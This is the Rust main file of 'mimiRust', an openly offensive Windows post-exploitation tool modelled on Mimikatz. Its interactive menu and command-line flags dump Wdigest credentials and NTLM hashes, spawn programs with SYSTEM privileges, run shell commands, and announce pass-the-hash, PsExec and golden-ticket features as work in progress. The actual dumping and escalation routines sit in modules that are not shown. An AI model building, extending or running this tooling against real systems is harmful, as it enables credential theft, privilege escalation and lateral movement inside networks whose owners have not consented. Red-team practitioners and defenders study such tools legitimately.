pub mod lateral_movement;
pub mod passwords;
pub mod privilege;
pub mod utilities;

use lateral_movement::{
    kerberos::GoldenTicket,
    pth::ExecuteWMI,
    scm::PSExec,
};

use passwords::{
    ntlm::Ntlm,
    wdigest::Wdigest, 
};

use privilege::Escalation;
use utilities::Utils;

use console::Term;
use clap::Parser;
use anyhow::Result;

#[derive(Parser, Debug)]
#[clap(about, author)]
struct Args {
    /// Spawn program with SYSTEM permissions from location
    #[clap(short, long, default_value = "")]
    spawn_path: String,

    /// Dumps systems credentials through Wdigest
    #[clap(long)]
    dump_credentials: bool,

    /// Dumps systems NTLM hashes
    #[clap(long)]
    dump_hashes: bool,

    /// Execute a shell command through the use of cmd
    #[clap(long)]
    shell: Vec<String>,
}


fn main() -> Result<()> {

    let args = Args::parse();
    if args.spawn_path.len() == 0 && args.shell.len() == 0 && args.dump_credentials == false && args.dump_hashes == false {
        println!("{}", banner());
        loop {
            let input = Utils::get_user_input(None);
            handle_user_input(input)?;
        }
    }

    if args.spawn_path.len() > 0 {
        Escalation::get_system(args.spawn_path)?;
    }

    if args.shell.len() > 0 {
        Escalation::execute_shell(args.shell)?;
    }

    if args.dump_credentials {
        Wdigest::grab()?;
    }

    if args.dump_hashes {
        Ntlm::grab()?;
    }


    Ok(())
}

fn banner() -> String {
    return "
    ███▄ ▄███▓ ██▓ ███▄ ▄███▓ ██▓ ██▀███   █    ██   ██████ ▄▄▄█████▓
    ▓██▒▀█▀ ██▒▓██▒▓██▒▀█▀ ██▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒
    ▓██    ▓██░▒██▒▓██    ▓██░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░
    ▒██    ▒██ ░██░▒██    ▒██ ░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ 
    ▒██▒   ░██▒░██░▒██▒   ░██▒░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░ 
    ░ ▒░   ░  ░░▓  ░ ▒░   ░  ░░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   
    ░  ░      ░ ▒ ░░  ░      ░ ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░    
    ░      ░    ▒ ░░      ░    ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░    ░      
           ░    ░         ░    ░     ░        ░           ░           

                    written in Rust by ThottySploity
            mimiRust $ means it's running without elevated privileges
             mimiRust # means it's running with elevated privileges
              mimiRust @ means it's running with system privileges             

    ".to_string();
}

//Perhaps make the menu in the way of :: use <mode>

fn handle_user_input(args: Vec<String>) -> Result<()> {
    match args[0].to_lowercase().as_str() {
        "passwords" => {
            loop {
                let input = Utils::get_user_input(Some("passwords".to_string()));
                match input[0].to_lowercase().as_str() {
                    "dump-credentials" => {
                        Wdigest::grab()?;
                    },
                    "dump-hashes" => {
                        Ntlm::grab()?;
                    },
                    "clear" => {
                        let term = Term::stdout();
                        term.clear_screen()?;
                        banner();
                    },
                    "exit" => {
                        main()?;
                    },
                    _ => {
                        println!("
                        \rdump-credentials             Dumps systems credentials through Wdigest.
                        \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
                        \rclear                        Clears the screen of any past output.
                        \rexit                         Moves to top level menu
                        ");
                    },
                };
            }
        },
        "pivioting" => {
            loop {
                let input = Utils::get_user_input(Some("pivioting".to_string()));
                match input[0].to_lowercase().as_str() {
                    "shell" => {
                        if input.clone().len() >= 1 {
                            Escalation::execute_shell(input.clone())?;
                        } else {
                            println!("[*] Please use it as: shell <SHELL COMMAND>");
                        }
                    },
                    "clear" => {
                        let term = Term::stdout();
                        term.clear_screen()?;
                        banner();
                    },
                    "exit" => {
                        main()?;
                    },
                    "psexec" => {
                        PSExec::new();
                    },
                    "pth" => {
                        ExecuteWMI::new();
                    },
                    "golden-ticket" => {
                        GoldenTicket::create();
                    },
                    _ => {
                        println!("
                        \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
                        \rclear                        Clears the screen of any past output.
                        \rexit                         Moves to top level menu
                        \r(W.I.P)psexec                Executes a service on another system.
                        \r(W.I.P)pth                   Pass-the-Hash to run a command on another system.
                        \r(W.I.P)golden-ticket         Creates a golden ticket for a user account with the domain.
                        ")
                    },
                };
            }
        },
        "privilege" => {
            loop {
                let input = Utils::get_user_input(Some("privilege".to_string()));
                match input[0].to_lowercase().as_str() {
                    "spawn-path" => {
                        if input.len() >= 1 {
                            Escalation::get_system(input[1].clone())?;
                        } else {
                            println!("[*] Please use it as: spawn-path <PATH TO EXECUTABLE>");
                        }
                    },
                    "clear" => {
                        let term = Term::stdout();
                        term.clear_screen()?;
                        banner();
                    },
                    "exit" => {
                        main()?;
                    },
                    _ => {
                        println!("
                        \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
                        \rclear                        Clears the screen of any past output.
                        \rexit                         Moves to top level menu
                        ")
                    },
                };
            }
        },
        "clear" => {
            let term = Term::stdout();
            term.clear_screen()?;
            banner();
        },
        "exit" => {
            println!("Bye!");
            std::process::exit(0x100);
        },
        "help" | "h" | "?" => {
            println!("
            \r
            \rChoose one of the following options:
            \r
            \r      passwords:
            \r              • dump-credentials             Dumps systems credentials through Wdigest.
            \r              • dump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
            \r              • clear                        Clears the screen of any past output.
            \r              • exit                         Moves to top level menu
            \r
            \r      pivioting:
            \r              • shell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
            \r              • clear                        Clears the screen of any past output.
            \r              • exit                         Moves to top level menu
            \r              • (W.I.P)psexec                Executes a service on another system.
            \r              • (W.I.P)pth                   Pass-the-Hash to run a command on another system.
            \r              • (W.I.P)golden-ticket         Creates a golden ticket for a user account with the domain.
            \r
            \r      privilege:
            \r              • spawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
            \r              • clear                        Clears the screen of any past output.
            \r              • exit                         Moves to top level menu
            \n\n");
        },
        _ => {
            println!("Please use: help, h or ?");
        },
    };
    Ok(())
}